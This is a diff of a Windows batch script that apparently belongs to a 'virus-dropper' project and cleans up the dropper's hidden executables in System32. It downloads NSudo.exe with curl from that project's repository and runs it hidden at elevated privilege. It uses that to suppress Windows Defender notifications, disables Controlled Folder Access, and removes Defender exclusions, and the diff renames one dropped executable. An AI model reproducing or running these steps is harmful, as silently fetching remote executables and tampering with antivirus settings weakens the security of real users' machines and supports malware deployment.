@@ -17,22 +17,22 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 attrib "%systemroot%\System32\Windowsexe\Windows.exe" -h -s
 attrib "%systemroot%\System32\Windowsexe\Windows2.exe" -h -s
-attrib "%systemroot%\System32\Windowsexe\Client.exe" -h -s
+attrib "%systemroot%\System32\Windowsexe\funky.exe" -h -s
 attrib "%systemroot%\System32\Windowsexe\AV.bat" -h -s
 Taskkill /IM "Windows.exe" /F
 Taskkill /IM "Windows2.exe" /F
-Taskkill /IM "Client.exe" /F
+Taskkill /IM "funky.exe" /F
 curl "https://raw.githubusercontent.com/034nop/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionProcess '"Windows.exe'"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionProcess '"Windows2.exe'"
-powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionProcess '"Client.exe'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionProcess '"funky.exe'"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
 del "%systemroot%\System32\Windowsexe\Windows.exe"
 del "%systemroot%\System32\Windowsexe\AV.bat"
 del "%systemroot%\System32\Windowsexe\Windows2.exe"
-del "%systemroot%\System32\Windowsexe\Client.exe"
+del "%systemroot%\System32\Windowsexe\funky.exe"
 rd "%systemroot%\System32\Windowsexe"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 del NSudo.exe
